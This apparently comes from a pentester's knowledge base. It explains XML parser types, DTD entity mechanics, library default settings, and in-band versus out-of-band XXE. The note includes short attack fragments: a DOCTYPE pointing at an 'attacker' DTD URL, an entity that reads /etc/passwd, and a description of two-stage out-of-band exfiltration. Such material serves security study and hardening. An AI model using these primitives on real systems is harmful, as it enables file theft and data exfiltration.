#webapplications

XML parser internals matter for offensive work because **XXE is a parser-configuration bug, not an application-logic bug** — the same malicious XML either does or doesn't trigger depending entirely on which parser/library the backend uses and which options it was initialized with. See [[XXE Injection]] for full exploitation technique; this note covers the parser landscape and the DTD mechanics those techniques rely on.

## Parser types

| Parser | How it reads XML | Trade-off | XXE relevance |
| --- | --- | --- | --- |
| **DOM** (Document Object Model) | Loads the entire document into an in-memory tree, random access to any node | Resource-intensive, but flexible | Most common XXE target — `DOMDocument`, Java `DocumentBuilder`, .NET `XmlDocument` all build a DOM and are the usual sink for file-upload/API XML parsing |
| **SAX** (Simple API for XML) | Streams the document sequentially, fires callbacks per element, never holds the whole tree | Low memory, but no random access / can't go "back" | Still vulnerable to XXE and entity-expansion DoS unless external entities are explicitly disabled on the factory |
| **StAX** (Streaming API for XML) | Pull-based streaming — the caller asks for the next event, rather than SAX pushing callbacks | More control than SAX over when/what to parse | Same entity-expansion risk as SAX if not hardened |
| **XPath** | Evaluates an expression against an already-parsed document (used heavily with XSLT) | N/A — it's a query layer, not a parser | Not itself an entity-resolution vector, but XSLT's `document()` function can perform its own SSRF/file-read independent of DTD entities — treat as a related, separate primitive when XSLT is in play |

## DTD mechanics — what's actually happening under the hood

A `<!DOCTYPE>` declaration can define a **Document Type Definition**, either inline (the *internal subset*) or by reference to an external file/URL:

```xml
<!DOCTYPE foo [ ... internal subset ... ]>              <!-- inline -->
<!DOCTYPE foo SYSTEM "http://attacker/evil.dtd">          <!-- external -->
<!DOCTYPE foo PUBLIC "-//some//public//id" "http://...">  <!-- external, public identifier -->
```

Inside that subset you can declare **entities** — named placeholders the parser substitutes before the document is handed to the application:

| Entity type | Syntax | Where it can be referenced | Notes |
| --- | --- | --- | --- |
| Internal general entity | `<!ENTITY name "literal text">` | Document body, via `&name;` | Just a text macro — basis of the Billion Laughs attack when entities reference each other recursively |
| External general entity | `<!ENTITY name SYSTEM "file:///etc/passwd">` | Document body, via `&name;` | The classic XXE file-read primitive |
| Internal **parameter** entity | `<!ENTITY % name "...">` | Only inside the DTD itself, via `%name;` | Used to build up other entity declarations dynamically |
| External parameter entity | `<!ENTITY % name SYSTEM "http://attacker/x.dtd">` | Only inside the DTD itself, via `%name;` | How OOB XXE chains a remote-hosted DTD into the target's parse — see the external-DTD technique in [[XXE Injection]] |

The reason OOB exfiltration usually needs an **externally-loaded** DTD rather than everything crammed into the internal subset: most modern libxml2 builds restrict a parameter entity declared in the internal subset from being referenced inside another entity's *value*, also within the internal subset. That restriction doesn't apply once the chaining happens inside a DTD the parser fetched externally — hence the two-stage "host your own `.dtd` file, point the victim's `DOCTYPE SYSTEM` at it" pattern.

## Parser/library default posture

Whether a given parser is exploitable out of the box depends on the library version and how it's instantiated — this changes over time as ecosystems harden their defaults, so always verify against the actual version in play rather than assuming:

| Library | Default posture | What flips it unsafe |
| --- | --- | --- |
| PHP `DOMDocument` (libxml2 ≥2.9) | Safe | Passing `LIBXML_NOENT \| LIBXML_DTDLOAD` (or `LIBXML_DTDATTLIST`) to `loadXML()`/`load()` |
| Java `DocumentBuilderFactory` / `SAXParserFactory` / `XMLInputFactory` | **Unsafe by default** | Nothing extra needed — must be explicitly hardened with `disallow-doctype-decl` or by disabling external entities |
| Python `lxml.etree` | Depends on version — check `resolve_entities` default | Passing `resolve_entities=True` to `XMLParser` |
| Python `xml.etree.ElementTree` (stdlib) | Doesn't expand external entities | N/A (but still vulnerable to Billion Laughs-style internal entity expansion) |
| .NET `XmlDocument`/`XmlReader` | Unsafe on Framework <4.5.2; safe on .NET Core/5+ | Setting `XmlReaderSettings.DtdProcessing = DtdProcessing.Parse` without also restricting entity resolution |
| Ruby Nokogiri | Safe-ish | Passing `Nokogiri::XML::ParseOptions::NOENT` |

A quick way to probe this blind, before trying file reads: send the **entity-expansion** detection payload (declare a benign entity, reference it twice, see if it's substituted) described in [[XXE Injection]] — it tells you whether the parser is doing any entity substitution at all, independent of whether external/`SYSTEM` entities specifically are allowed.

## In-band vs out-of-band (quick definitions)

- **In-band XXE** — the application reflects the entity's resolved value back in the HTTP response. Straightforward: inject, read the response, done.
- **Out-of-band (OOB) XXE** — the application never shows you the resolved value (e.g. it stores the field instead of echoing it). You instead make the entity resolve to a URL you control, and read the exfiltrated data from your own listener's logs (or a DNS query, if HTTP egress is blocked but DNS isn't).

Full exploitation detail, payloads, and the error-based fallback for when there's no outbound access at all live in [[XXE Injection]].
